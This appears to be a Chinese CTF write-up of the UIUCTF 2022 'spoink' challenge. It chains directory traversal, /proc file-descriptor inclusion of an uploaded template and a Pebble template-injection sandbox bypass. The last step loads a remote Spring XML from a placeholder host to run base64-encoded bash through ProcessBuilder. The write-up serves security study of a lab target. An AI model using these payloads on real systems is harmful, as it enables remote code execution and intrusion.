---
title: "Java学习笔记Ⅹ"
slug: "java-study-notes-10-ctf"
description: "CTF刷题进行时！"
date: 2022-09-07T21:20:56+08:00
categories: ["CTF"]
series: ["Java学习笔记"]
tags: ["Java", "wp"]
draft: false
toc: true
---

## [UIUCTF 2022]spoink

> 环境：https://github.com/sigpwny/UIUCTF-2022-Public/tree/main/web/spoink
>
> 参考wp：https://tttang.com/archive/1692/

### debug准备

修改docker-compose.yml，增加debug port

修改Dockerfile最后启动的CMD命令

```dockerfile
CMD ["java", "-jar", "-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:8881", "/usr/src/app/spoink-0.0.1-SNAPSHOT-spring-boot.jar"]
```

把jar包拖出来，以zip解压，idea打开项目，添加Remote JVM Debug的debug配置项

起容器，看pom.xml，找到mainClass和Controller，下断点并打开调试

### 目录穿越

整个java web项目只有一个controller

```java
@Controller
public class HomeController {
    public HomeController() {
    }

    @RequestMapping({"/"})
    public String getTemplate(@RequestParam("x") Optional<String> template, Model model) {
        return (String)template.orElse("home.pebble");
    }
}
```

我第一眼看的时候以为是 传入的`x`参数内容会被pebble模板渲染(SSTI)，仔细看了下发现是我思维定势了，其实是根据参数`x`的内容返回指定模板String（可能有LFI），而配环境的时候我们知道flag是需要执行./getflag的，所以最后还需要rce

注意到application.properties有pebble的配置，没有设置后缀suffix

```
pebble.prefix = templates
pebble.suffix =
```

打断点（这里直接断不好断，它调用完pebble相关的库之后不会留在调用栈里，直接就到了spring）

![image-20220907100712037](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220907100712037.png)

在com.mitchellbosecke.pebble.loader.FileLoader#getFile处有路径拼接的地方，对templateName无过滤拼到`templates/`后面，可以目录穿越（没有设置后缀的原因）

```
/?x=../../../../../../../../../../../etc/passwd
```

### 文件上传

但是flag需要rce才能读到，我们考虑上传带有恶意内容的模板文件到服务器，结合这个LFI进行rce；如何上传文件呢？由于题目用到了spring mvc（内含tomcat），框架本身是支持文件上传功能的

在org.springframework.web.servlet.DispatcherServlet#doDispatch中有处理表单请求的地方

![image-20220907103238423](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220907103238423.png)

可以看到最后调用到org.apache.catalina.connector.Request#getParts去解析内容，这部分tomcat文件上传流量层面的东西Y4师傅已经研究过了（非常非常强！）->[探寻Tomcat文件上传流量层面绕waf新姿势](https://y4tacker.github.io/2022/06/19/year/2022/6/探寻Tomcat文件上传流量层面绕waf新姿势/)  |  [探寻Java文件上传流量层面waf绕过姿势系列二](https://y4tacker.github.io/2022/06/21/year/2022/6/探寻Java文件上传流量层面waf绕过姿势系列二/)

类似php，这里上传文件会被保存到一个临时目录再复制到目标文件夹，起初路径在javax.servlet.MultipartConfigElement#getLocation中获取，默认为空，会使后面的location从javax.servlet.context.tempdir中获取

![image-20220907105829293](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220907105829293.png)

是一个随机生成的文件夹，甚至最后的文件名也是靠getUniqueId生成的，无法爆破

但是得益于linux下的文件描述符，我们可以爆破它；甚至于因为题目处于docker环境之下，我们可以直接冲`/proc/1/fd/$X$`

```
curl --limit-rate 1k -X POST http://10.10.1.100:8882 -F "file=@/tmp/1.txt"
```

*但是我这里因为环境问题总是爆不出来？用`/proc/1`是不行的 emmmmm暂时不清楚原因

### 模板注入

之后就是pebble模板注入的事情了，但是目标环境是最新版的，修复了之前的问题

测试payload（文件名t1）

```
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

报错

```
com.mitchellbosecke.pebble.error.ClassAccessException: For security reasons access to public static java.lang.Class java.lang.Class.forName(java.lang.String) throws java.lang.ClassNotFoundException method is denied. (t1:3)
        at com.mitchellbosecke.pebble.attributes.MemberCacheUtils.verifyUnsafeMethod(MemberCacheUtils.java:180) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.attributes.MemberCacheUtils.findMethod(MemberCacheUtils.java:149) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.attributes.MemberCacheUtils.reflect(MemberCacheUtils.java:89) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.attributes.MemberCacheUtils.cacheMember(MemberCacheUtils.java:31) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.attributes.DefaultAttributeResolver.resolve(DefaultAttributeResolver.java:63) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.node.expression.GetAttributeExpression.evaluate(GetAttributeExpression.java:82) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.node.expression.GetAttributeExpression.evaluate(GetAttributeExpression.java:61) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.node.expression.GetAttributeExpression.evaluate(GetAttributeExpression.java:61) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.node.expression.GetAttributeExpression.evaluate(GetAttributeExpression.java:61) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.node.expression.GetAttributeExpression.evaluate(GetAttributeExpression.java:61) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.node.expression.GetAttributeExpression.evaluate(GetAttributeExpression.java:61) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.node.expression.GetAttributeExpression.evaluate(GetAttributeExpression.java:61) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.node.SetNode.render(SetNode.java:31) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.node.BodyNode.render(BodyNode.java:43) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.node.RootNode.render(RootNode.java:30) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.template.PebbleTemplateImpl.evaluate(PebbleTemplateImpl.java:157) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.template.PebbleTemplateImpl.evaluate(PebbleTemplateImpl.java:105) ~[pebble-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.spring.servlet.PebbleView.evaluateTemplate(PebbleView.java:86) ~[pebble-spring5-3.1.5.jar!/:na]
        at com.mitchellbosecke.pebble.spring.servlet.PebbleView.renderMergedTemplateModel(PebbleView.java:61) ~[pebble-spring5-3.1.5.jar!/:na]
```

报错method is denied，下面列出来的都是denied。。。。看一下调用栈，模板在com.mitchellbosecke.pebble.node.expression.GetAttributeExpression#evaluate处被处理，从后往前处理函数内容，起到限制的函数是com.mitchellbosecke.pebble.attributes.methodaccess.BlacklistMethodAccessValidator#isMethodAccessAllowed

```java
public class BlacklistMethodAccessValidator implements MethodAccessValidator {
    private static final String[] FORBIDDEN_METHODS = new String[]{"getClass", "wait", "notify", "notifyAll"};

    public BlacklistMethodAccessValidator() {
    }

    public boolean isMethodAccessAllowed(Object object, Method method) {
        boolean methodForbidden = object instanceof Class || object instanceof Runtime || object instanceof Thread || object instanceof ThreadGroup || object instanceof System || object instanceof AccessibleObject || this.isUnsafeMethod(method);
        return !methodForbidden;
    }

    private boolean isUnsafeMethod(Method member) {
        return this.isAnyOfMethods(member, FORBIDDEN_METHODS);
    }

    private boolean isAnyOfMethods(Method member, String... methods) {
        String[] var3 = methods;
        int var4 = methods.length;

        for(int var5 = 0; var5 < var4; ++var5) {
            String method = var3[var5];
            if (this.isMethodWithName(member, method)) {
                return true;
            }
        }

        return false;
    }

    private boolean isMethodWithName(Method member, String method) {
        return member.getName().equals(method);
    }
}
```

### beans到classLoader

spring框架中许多实例都隐式注册为bean，因此我们思考能否从bean中找到一个保存了classloader的对象，再从它调用loadClass来加载任意对象

那我们看看程序的上下文，pebble初始化是在com.mitchellbosecke.pebble.template.PebbleTemplateImpl#evaluate(java.io.Writer, java.util.Map<java.lang.String,java.lang.Object>, java.util.Locale)中

![image-20220907165851990](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220907165851990.png)

向上看代码，这里获取了spring的应用程序上下文并添加到beans属性中

![image-20220907171114591](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220907171114591.png)

写一个路由用来遍历

```java
@RequestMapping({"/"})
public String getTemplate(@RequestParam("x") Optional<String> template, Model model){
	ServletContext sss = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest().getSession().getServletContext();
	org.springframework.web.context.WebApplicationContext context = org.springframework.web.context.support.WebApplicationContextUtils.getWebApplicationContect(sss);
	String[] beanDefinitionNaems = context.getBeanDefinitionNames();
	for(String o: beanDefinitionNames){
		System.out.println(o.toString());
	}
	return (String)template.orElse("home.pebble");
}
```

一堆输出，其中的internalCachingMetadataReaderFactory对象可以拿到classLoader

```java
this.applicationContext.getBean("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory")
```

![image-20220907172251785](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220907172251785.png)

我们可以用它的loadClass加载任意类了，但是我们再继续用它的方法，幸运的是这里还有jackson，beans里面也能获取到

![image-20220907173342035](https://amiz-1307622586.cos.ap-chongqing.myqcloud.com/images/image-20220907173342035.png)

可以用jackson获取到类的实例，进而调用方法

```
{%set ame = beans.get("jacksonObjectMapper").readValue("{}", classssss)%}
```

### 绕过jackson黑名单

然而题目环境是最新的java18，常用的一些办法不能用，比如ScriptEngineManager，由于jackson实例化限制我们也不能直接实例化jshell；但是我们可以借助java.beans.Beans类，它可以帮我们实例化任意方法

```java
public static Object instantiate(ClassLoader cls, String beanName,
                                 BeanContext beanContext,
                                 AppletInitializer initializer)
        throws IOException, ClassNotFoundException {
    InputStream ins;
    ObjectInputStream oins = null;
    Object result = null;
    boolean serialized = false;
    IOException serex = null;
    // If the given classloader is null, we check if an
    // system classloader is available and (if so)
    // use that instead.
    // Note that calls on the system class loader will
    // look in the bootstrap class loader first.
    if (cls == null) {
        try {
            cls = ClassLoader.getSystemClassLoader();
        } catch (SecurityException ex) {
            // We're not allowed to access the system class loader.
            // Drop through.
        }
    }
    // Try to find a serialized object with this name
    final String serName = beanName.replace('.','/').concat(".ser");
    if (cls == null)
        ins =  ClassLoader.getSystemResourceAsStream(serName);
    else
        ins =  cls.getResourceAsStream(serName);
    if (ins != null) {
        try {
            if (cls == null) {
                oins = new ObjectInputStream(ins);
            } else {
                oins = new ObjectInputStreamWithLoader(ins, cls);
            }
            result = oins.readObject();
            serialized = true;
            oins.close();
        } catch (IOException ex) {
            ins.close();
            // Drop through and try opening the class.  But remember
            // the exception in case we can't find the class either.
            serex = ex;
        } catch (ClassNotFoundException ex) {
            ins.close();
            throw ex;
        }
    }
    if (result == null) {
        // No serialized object, try just instantiating the class
        Class<?> cl;
        try {
            cl = ClassFinder.findClass(beanName, cls);
        } catch (ClassNotFoundException ex) {
            // There is no appropriate class.  If we earlier tried to
            // deserialize an object and got an IO exception, throw that,
            // otherwise rethrow the ClassNotFoundException.
            if (serex != null) {
                throw serex;
            }
            throw ex;
        }
        if (!Modifier.isPublic(cl.getModifiers())) {
            throw new ClassNotFoundException("" + cl + " : no public access");
        }
        /*
         * Try to instantiate the class.
         */
        try {
            result = cl.newInstance();
        } catch (Exception ex) {
            // We have to remap the exception to one in our signature.
            // But we pass extra information in the detail message.
            throw new ClassNotFoundException("" + cl + " : " + ex, ex);
        }
    }
    if (result != null) {
        // Ok, if the result is an applet initialize it.
        AppletStub stub = null;
        if (result instanceof Applet) {
            Applet  applet      = (Applet) result;
            boolean needDummies = initializer == null;
            if (needDummies) {
                // Figure our the codebase and docbase URLs.  We do this
                // by locating the URL for a known resource, and then
                // massaging the URL.
                // First find the "resource name" corresponding to the bean
                // itself.  So a serialzied bean "a.b.c" would imply a
                // resource name of "a/b/c.ser" and a classname of "x.y"
                // would imply a resource name of "x/y.class".
                final String resourceName;
                if (serialized) {
                    // Serialized bean
                    resourceName = beanName.replace('.','/').concat(".ser");
                } else {
                    // Regular class
                    resourceName = beanName.replace('.','/').concat(".class");
                }
                URL objectUrl = null;
                URL codeBase  = null;
                URL docBase   = null;
                // Now get the URL correponding to the resource name.
                if (cls == null) {
                    objectUrl = ClassLoader.getSystemResource(resourceName);
                } else
                    objectUrl = cls.getResource(resourceName);
                // If we found a URL, we try to locate the docbase by taking
                // of the final path name component, and the code base by taking
                // of the complete resourceName.
                // So if we had a resourceName of "a/b/c.class" and we got an
                // objectURL of "file://bert/classes/a/b/c.class" then we would
                // want to set the codebase to "file://bert/classes/" and the
                // docbase to "file://bert/classes/a/b/"
                if (objectUrl != null) {
                    String s = objectUrl.toExternalForm();
                    if (s.endsWith(resourceName)) {
                        int ix   = s.length() - resourceName.length();
                        codeBase = new URL(s.substring(0,ix));
                        docBase  = codeBase;
                        ix = s.lastIndexOf('/');
                        if (ix >= 0) {
                            docBase = new URL(s.substring(0,ix+1));
                        }
                    }
                }
                // Setup a default context and stub.
                BeansAppletContext context = new BeansAppletContext(applet);
                stub = (AppletStub)new BeansAppletStub(applet, context, codeBase, docBase);
                applet.setStub(stub);
            } else {
                initializer.initialize(applet, beanContext);
            }
            // now, if there is a BeanContext, add the bean, if applicable.
            if (beanContext != null) {
                unsafeBeanContextAdd(beanContext, result);
            }
            // If it was deserialized then it was already init-ed.
            // Otherwise we need to initialize it.
            if (!serialized) {
                // We need to set a reasonable initial size, as many
                // applets are unhappy if they are started without
                // having been explicitly sized.
                applet.setSize(100,100);
                applet.init();
            }
            if (needDummies) {
              ((BeansAppletStub)stub).active = true;
            } else initializer.activate(applet);
        } else if (beanContext != null) unsafeBeanContextAdd(beanContext, result);
    }
    return result;
}

```

cls为null则会默认调用ClassLoader.getSystemClassLoader()获取一个classloader，当结果为空时尝试调用ClassFinder.findClass(beanName, cls)

### payload

模板

```
{% set y= beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory").resourceLoader.classLoader.loadClass("java.beans.Beans") %}
{% set yy =  beans.get("jacksonObjectMapper").readValue("{}", y) %}
{% set yyy = yy.instantiate(null,"org.springframework.context.support.ClassPathXmlApplicationContext") %}
{{ yyy.setConfigLocation("http://xxxx/1.xml") }}
{{ yyy.refresh() }}
```

xml文件

```xml
<?xml version="1.0" encoding="UTF-8" ?>
    <beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="
     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
            <constructor-arg >
            <list>
                <value>bash</value>
                <value>-c</value>
                <value>echo Li9nZXRmbGFnID4gL3RtcC9mbGFn|base64 -d|bash -i</value>
            </list>
            </constructor-arg>
        </bean>
    </beans>
```

先传模板再爆破包含，拿shell